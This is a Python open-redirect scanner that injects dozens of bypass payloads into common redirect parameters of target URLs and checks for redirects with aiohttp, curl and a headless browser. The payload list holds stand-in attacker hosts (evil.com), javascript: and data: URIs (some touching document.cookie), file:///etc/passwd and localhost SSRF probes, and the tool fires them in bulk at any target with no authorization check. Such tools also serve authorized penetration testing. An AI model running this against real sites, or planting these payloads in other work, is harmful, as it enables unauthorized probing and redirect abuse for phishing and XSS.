#!/usr/bin/env python3
# Advanced Open Redirect Scanner v4.0
# Author: Jass (Enhanced Edition)

import requests
import argparse
import sys
import urllib.parse
import csv
import json
from datetime import datetime
from termcolor import colored
from urllib3.exceptions import InsecureRequestWarning
from playwright.async_api import async_playwright
from bs4 import BeautifulSoup
import aiohttp
import asyncio
import re
import logging
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
import random
import hashlib
import base64

# ASCII Banner
BANNER = r"""


 _______                      ______            _ _                             ______                                     
(_______)                    (_____ \          | (_)                    _      / _____)                                    
 _     _ ____  _____ ____     _____) )_____  __| |_  ____ _____  ____ _| |_   ( (____   ____ _____ ____  ____  _____  ____ 
| |   | |  _ \| ___ |  _ \   |  __  /| ___ |/ _  | |/ ___) ___ |/ ___|_   _)   \____ \ / ___|____ |  _ \|  _ \| ___ |/ ___)
| |___| | |_| | ____| | | |  | |  \ \| ____( (_| | | |   | ____( (___  | |_    _____) | (___/ ___ | | | | | | | ____| |    
 \_____/|  __/|_____)_| |_|  |_|   |_|_____)\____|_|_|   |_____)\____)  \__)  (______/ \____)_____|_| |_|_| |_|_____)_|    
        |_|                                                                                                                
      
                        Advanced Open Redirect Scanner v4.0

"""

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[logging.FileHandler(f"redirect_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")]
)

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Advanced redirect parameters (expanded list)
REDIRECT_PARAMS = [
    "next", "url", "redirect", "return", "to", "continue", "dest", "destination", 
    "path", "redirect_uri", "return_url", "window", "link", "view", "go", "goto",
    "target", "rurl", "out", "ref", "reference", "site", "html", "val", "validate",
    "domain", "callback", "return_to", "page", "feed", "host", "port", "forward",
    "forward_url", "success", "success_url", "follow", "load", "file", "checkout",
    "checkout_url", "continue_url", "return_path", "image_url", "img_url", "load_url",
    "load_file", "navigate", "navigation", "open", "redir", "redirection", "redirectUrl",
    "redirect_url", "returnTo", "return-to", "callback_url", "jump", "move", "location"
]

# Advanced payloads with encoding variations and bypass techniques
ADVANCED_PAYLOADS = [
    # Standard payloads
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    
    # Protocol-relative with paths
    "//evil.com/",
    "//evil.com//",
    "//evil.com/%2F..",
    "//evil.com/%252F..",
    
    # URL encoding bypasses
    "https%3A%2F%2Fevil.com",
    "%2F%2Fevil.com",
    "%2f%2fevil.com",
    
    # Double encoding
    "%252F%252Fevil.com",
    
    # Backslash bypasses
    "\\evil.com",
    "\\\\evil.com",
    "/\\evil.com",
    "\\/evil.com",
    
    # Tab and newline bypasses
    "/%09/evil.com",
    "/%0a/evil.com",
    "/%0d/evil.com",
    "/\t/evil.com",
    "/\r/evil.com",
    "/\n/evil.com",
    
    # Whitespace bypasses
    "/ /evil.com",
    "/%20/evil.com",
    
    # Multiple slashes
    "///evil.com",
    "////evil.com",
    
    # @ symbol bypasses
    "https://legitimate.com@evil.com",
    "https://evil.com@legitimate.com",
    
    # Subdomain confusion
    "https://evil.com.legitimate.com",
    
    # Null byte injection
    "//evil.com%00.legitimate.com",
    "//evil.com%2500.legitimate.com",
    
    # JavaScript protocols
    "javascript:alert(document.domain)",
    "javascript://%0aalert(document.domain)",
    "javascript://%250aalert(document.cookie)",
    "javascript:alert('XSS')",
    "jAvAsCrIpT:alert(1)",
    
    # Data URIs
    "data:text/html,<script>alert(document.domain)</script>",
    "data://text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+",
    "data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+",
    
    # VBScript (older IE)
    "vbscript:msgbox(document.domain)",
    
    # File protocol
    "file:///etc/passwd",
    "file://evil.com/share",
    
    # Localhost/SSRF attempts
    "//127.0.0.1",
    "//localhost",
    "//[::1]",
    "//0.0.0.0",
    
    # Unicode bypasses
    "//evil。com",
    "//evil%E3%80%82com",
    
    # Homograph attacks
    "//еvil.com",  # Cyrillic 'e'
    
    # Case variations
    "//EVIL.COM",
    "//EvIl.CoM",
    
    # Dots and path traversal
    "/..//evil.com",
    "/..%2Fevil.com",
    "/.%2e/evil.com",
    
    # Question mark bypass
    "//evil.com?",
    "//evil.com?.legitimate.com",
    
    # Fragment bypass
    "//evil.com#",
    "//evil.com#.legitimate.com",
    
    # Port specification
    "//evil.com:80",
    "//evil.com:443",
    
    # With credentials
    "//user:pass@evil.com",
    
    # Encoded special chars
    "//evil%252ecom",
    "//%65vil.com",
    
    # Mixed encoding
    "/%2f%2fevil.com",
    "/%5c%5cevil.com",
]

# Canary domains for testing (replace with your own controlled domains)
CANARY_DOMAINS = ["evil.com", "attacker.com", "malicious.com", "test-redirect.com"]

# Results storage
vuln_results = []
result_lock = threading.Lock()

# Semaphores
HTTP_SEMAPHORE = None
BROWSER_SEMAPHORE = None

def display_banner():
    print(colored(BANNER, "cyan", attrs=["bold"]))
    print(colored("=" * 80, "cyan"))

def print_msg(msg, prefix="🔍", color="cyan", is_silent=False):
    if not is_silent:
        print(colored(f"{prefix} {msg}", color, attrs=["bold"]))

# Generate unique identifier for testing
def generate_unique_id():
    return hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

# Advanced URL manipulation
def inject_payload(url, param, payload):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    query[param] = [payload]
    new_query = urllib.parse.urlencode(query, doseq=True)
    return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                   parsed.params, new_query, parsed.fragment))

# Check for JavaScript redirects in response body
async def check_js_redirects(html_content, canary_domains):
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Meta refresh
    meta = soup.find("meta", attrs={"http-equiv": "refresh"})
    if meta and meta.get("content"):
        match = re.search(r"url=(['\"]?)(.*?)\1", meta["content"], re.IGNORECASE)
        if match:
            redirect_url = match.group(2)
            netloc = urllib.parse.urlparse(redirect_url).netloc.lower()
            for domain in canary_domains:
                if domain in netloc:
                    return "meta_refresh", redirect_url
    
    # JavaScript location changes
    scripts = soup.find_all("script")
    js_patterns = [
        r"window\.location\.href\s*=\s*['\"]([^'\"]+)",
        r"window\.location\s*=\s*['\"]([^'\"]+)",
        r"location\.href\s*=\s*['\"]([^'\"]+)",
        r"location\s*=\s*['\"]([^'\"]+)",
        r"window\.location\.assign\s*\(\s*['\"]([^'\"]+)",
        r"window\.location\.replace\s*\(\s*['\"]([^'\"]+)",
        r"document\.location\s*=\s*['\"]([^'\"]+)",
        r"window\.open\s*\(\s*['\"]([^'\"]+)",
    ]
    
    for script in scripts:
        if script.string:
            for pattern in js_patterns:
                match = re.search(pattern, script.string)
                if match:
                    redirect_url = match.group(1)
                    netloc = urllib.parse.urlparse(redirect_url).netloc.lower()
                    for domain in canary_domains:
                        if domain in netloc:
                            return "js_redirect", redirect_url
    return None, None

# Check response headers for redirect
def check_redirect_headers(response):
    location = response.headers.get("Location", "")
    refresh = response.headers.get("Refresh", "")
    
    if location:
        return "location", location
    if refresh:
        match = re.search(r"url=(['\"]?)(.*?)\1", refresh, re.IGNORECASE)
        if match:
            return "refresh", match.group(2)
    return None, None

# Verify redirect with curl
async def verify_with_curl(url, canary_domains, timeout=15):
    try:
        process = await asyncio.create_subprocess_exec(
            "curl", "-s", "-L", "-w", "%{url_effective}", "-o", "/dev/null", 
            "--max-time", str(timeout), url,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout+5)
        final_url = stdout.decode('utf-8').strip()
        
        netloc = urllib.parse.urlparse(final_url).netloc.lower()
        for domain in canary_domains:
            if domain in netloc:
                return True, final_url
        return False, final_url
    except:
        return False, None

# Check with headless browser for JavaScript execution
async def check_with_browser(url, payload, timeout=30):
    try:
        async with BROWSER_SEMAPHORE:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(
                    ignore_https_errors=True,
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                )
                page = await context.new_page()
                
                # Track dialogs and navigation
                dialog_triggered = False
                final_url = None
                
                async def handle_dialog(dialog):
                    nonlocal dialog_triggered
                    dialog_triggered = True
                    await dialog.dismiss()
                
                page.on("dialog", handle_dialog)
                
                try:
                    response = await page.goto(url, timeout=timeout*1000, wait_until="networkidle")
                    final_url = page.url
                    
                    # Check if JavaScript payload executed
                    if "javascript:" in payload.lower() and dialog_triggered:
                        await browser.close()
                        return "js_execution", url, True
                    
                    # Check if navigation occurred
                    if final_url and final_url != url:
                        netloc = urllib.parse.urlparse(final_url).netloc.lower()
                        for domain in CANARY_DOMAINS:
                            if domain in netloc:
                                await browser.close()
                                return "navigation", final_url, True
                    
                except Exception as e:
                    pass
                finally:
                    await browser.close()
        
        return None, None, False
    except Exception as e:
        logging.debug(f"Browser check failed: {e}")
        return None, None, False

# Main scanning function
async def scan_url_for_redirect(url, param, payload, debug=False, timeout=15):
    test_url = inject_payload(url, param, payload)
    result = {
        "original_url": url,
        "parameter": param,
        "payload": payload,
        "test_url": test_url,
        "vulnerable": False,
        "method": "",
        "redirect_to": "",
        "severity": "",
        "curl_verified": False,
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    async with HTTP_SEMAPHORE:
        try:
            # First check: HTTP request
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout)) as session:
                async with session.get(test_url, allow_redirects=False, ssl=False) as response:
                    html = await response.text()
                    
                    # Check redirect headers
                    header_type, redirect_url = check_redirect_headers(response)
                    if header_type and redirect_url:
                        netloc = urllib.parse.urlparse(redirect_url).netloc.lower()
                        for domain in CANARY_DOMAINS:
                            if domain in netloc:
                                result["vulnerable"] = True
                                result["method"] = f"header_{header_type}"
                                result["redirect_to"] = redirect_url
                                
                                # Verify with curl
                                verified, final_url = await verify_with_curl(test_url, CANARY_DOMAINS, timeout)
                                result["curl_verified"] = verified
                                if verified:
                                    result["redirect_to"] = final_url
                                
                                # Determine severity
                                if "javascript:" in payload.lower():
                                    result["severity"] = "Critical"
                                elif any(d in payload.lower() for d in ["evil.com", "attacker.com"]):
                                    result["severity"] = "High"
                                else:
                                    result["severity"] = "Medium"
                                
                                with result_lock:
                                    vuln_results.append(result)
                                return result
                    
                    # Check JavaScript redirects
                    js_type, js_redirect = await check_js_redirects(html, CANARY_DOMAINS)
                    if js_type:
                        result["vulnerable"] = True
                        result["method"] = js_type
                        result["redirect_to"] = js_redirect
                        result["severity"] = "Medium"
                        
                        with result_lock:
                            vuln_results.append(result)
                        return result
            
            # Second check: Browser-based (for JavaScript payloads)
            if "javascript:" in payload.lower() or "data:" in payload.lower():
                method, redirect_to, is_vuln = await check_with_browser(test_url, payload, timeout)
                if is_vuln:
                    result["vulnerable"] = True
                    result["method"] = method
                    result["redirect_to"] = redirect_to or "JavaScript Executed"
                    result["severity"] = "Critical"
                    
                    with result_lock:
                        vuln_results.append(result)
                    return result
        
        except Exception as e:
            if debug:
                logging.debug(f"Error scanning {test_url}: {e}")
    
    return None

# Worker for parallel scanning
async def scan_worker(url, params, payloads, debug=False, timeout=15):
    tasks = []
    for param in params:
        for payload in payloads:
            tasks.append(scan_url_for_redirect(url, param, payload, debug, timeout))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return [r for r in results if isinstance(r, dict) and r.get("vulnerable")]

# Main scan orchestrator
async def run_scans(targets, params, payloads, max_concurrent, debug=False, timeout=15, is_silent=False):
    for i, target in enumerate(targets, 1):
        print_msg(f"Scanning [{i}/{len(targets)}]: {target}", "🎯", "cyan", is_silent)
        await scan_worker(target, params, payloads, debug, timeout)

# Process input file
def process_file(filepath):
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logging.error(f"Error reading file {filepath}: {e}")
        return []

# Print summary
def print_summary(args):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    print("\n" + colored("=" * 80, "cyan"))
    print(colored("📊 SCAN RESULTS SUMMARY", "cyan", attrs=["bold"]))
    print(colored("=" * 80, "cyan"))
    
    if not vuln_results:
        print(colored("\n✅ No vulnerabilities found!", "green", attrs=["bold"]))
        return
    
    # Group by severity
    critical = [v for v in vuln_results if v["severity"] == "Critical"]
    high = [v for v in vuln_results if v["severity"] == "High"]
    medium = [v for v in vuln_results if v["severity"] == "Medium"]
    
    print(colored(f"\n🔴 Critical: {len(critical)}", "red", attrs=["bold"]))
    print(colored(f"🟠 High: {len(high)}", "yellow", attrs=["bold"]))
    print(colored(f"🟡 Medium: {len(medium)}", "cyan", attrs=["bold"]))
    print(colored(f"\n📈 Total Vulnerabilities: {len(vuln_results)}", "magenta", attrs=["bold"]))
    
    # Detailed results
    print(colored("\n" + "=" * 80, "cyan"))
    print(colored("🔍 DETAILED FINDINGS", "cyan", attrs=["bold"]))
    print(colored("=" * 80, "cyan"))
    
    for vuln in vuln_results:
        severity_color = "red" if vuln["severity"] == "Critical" else \
                        "yellow" if vuln["severity"] == "High" else "cyan"
        
        print(colored(f"\n[{vuln['severity']}] Open Redirect Detected", severity_color, attrs=["bold"]))
        print(f"  • Target URL: {vuln['original_url']}")
        print(f"  • Parameter: {vuln['parameter']}")
        print(f"  • Payload: {vuln['payload']}")
        print(f"  • Detection Method: {vuln['method']}")
        print(f"  • Redirects To: {vuln['redirect_to']}")
        print(f"  • cURL Verified: {'✅ Yes' if vuln['curl_verified'] else '❌ No'}")
        print(f"  • Test URL: {vuln['test_url']}")
        print(f"  • Timestamp: {vuln['timestamp']}")
        print(colored("  " + "-" * 76, "white"))
    
    # Export results
    if args.export:
        if args.export == "json":
            filename = f"redirect_scan_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(vuln_results, f, indent=2)
            print(colored(f"\n💾 Results exported to {filename}", "green", attrs=["bold"]))
        
        elif args.export == "csv":
            filename = f"redirect_scan_{timestamp}.csv"
            with open(filename, 'w', newline='') as f:
                fieldnames = ["original_url", "parameter", "payload", "test_url", 
                            "method", "redirect_to", "severity", "curl_verified", "timestamp"]
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                for vuln in vuln_results:
                    writer.writerow({k: vuln[k] for k in fieldnames})
            print(colored(f"\n💾 Results exported to {filename}", "green", attrs=["bold"]))

# Main function
def main():
    parser = argparse.ArgumentParser(
        description="🚀 Advanced Open Redirect Scanner v4.0",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument("-u", "--url", help="Single URL to scan")
    parser.add_argument("-f", "--file", help="File containing URLs to scan")
    parser.add_argument("-p", "--params", help="Custom parameters (comma-separated)")
    parser.add_argument("-pl", "--payloads", help="Custom payloads file")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Concurrent threads")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout (seconds)")
    parser.add_argument("-o", "--export", choices=["json", "csv"], help="Export format")
    parser.add_argument("-d", "--debug", action="store_true", help="Debug mode")
    parser.add_argument("-s", "--silent", action="store_true", help="Silent mode")
    parser.add_argument("--no-browser", action="store_true", help="Skip browser-based checks")
    
    args = parser.parse_args()
    
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Setup semaphores
    global HTTP_SEMAPHORE, BROWSER_SEMAPHORE
    HTTP_SEMAPHORE = asyncio.Semaphore(args.threads * 2)
    BROWSER_SEMAPHORE = asyncio.Semaphore(max(1, args.threads // 2))
    
    # Get targets
    targets = []
    if args.url:
        targets.append(args.url)
    if args.file:
        targets.extend(process_file(args.file))
    
    if not targets:
        display_banner()
        parser.print_help()
        sys.exit(1)
    
    # Get parameters
    params = REDIRECT_PARAMS
    if args.params:
        custom_params = [p.strip() for p in args.params.split(',')]
        params = list(set(params + custom_params))
    
    # Get payloads
    payloads = ADVANCED_PAYLOADS
    if args.payloads:
        try:
            with open(args.payloads, 'r') as f:
                custom_payloads = [line.strip() for line in f if line.strip()]
                payloads = list(set(payloads + custom_payloads))
        except Exception as e:
            logging.error(f"Error reading payloads file: {e}")
    
    # Display banner
    display_banner()
    print_msg(f"🎯 Targets: {len(targets)}", "📌", "cyan", args.silent)
    print_msg(f"🔧 Parameters: {len(params)}", "📌", "cyan", args.silent)
    print_msg(f"💉 Payloads: {len(payloads)}", "📌", "cyan", args.silent)
    print_msg(f"⚡ Threads: {args.threads}", "📌", "cyan", args.silent)
    print(colored("=" * 80 + "\n", "cyan"))
    
    # Start scan
    start_time = time.time()
    asyncio.run(run_scans(targets, params, payloads, args.threads, args.debug, args.timeout, args.silent))
    
    # Print summary
    print_summary(args)
    
    elapsed = time.time() - start_time
    print(colored(f"\n⏱️  Scan completed in {elapsed:.2f} seconds", "green", attrs=["bold"]))
    print(colored("=" * 80, "cyan"))

if __name__ == "__main__":
    main()
